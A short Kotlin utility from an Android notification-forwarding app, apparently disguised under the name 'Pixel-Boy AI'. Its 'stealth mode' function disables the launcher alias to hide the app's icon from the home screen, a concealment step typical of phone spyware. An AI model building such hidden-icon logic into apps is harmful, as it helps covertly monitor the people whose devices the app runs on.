package com.itsazni.notificationforwarder

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object StealthUtils {

    fun switchToStealthMode(context: Context) {
        val packageManager = context.packageManager

        // تعطيل الأيقونة الظاهرة في الشاشة الرئيسية (Pixel-Boy AI)
        val mainAlias = ComponentName(
            context,
            "com.itsazni.notificationforwarder.MainActivityAlias"
        )

        try {
            packageManager.setComponentEnabledSetting(
                mainAlias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
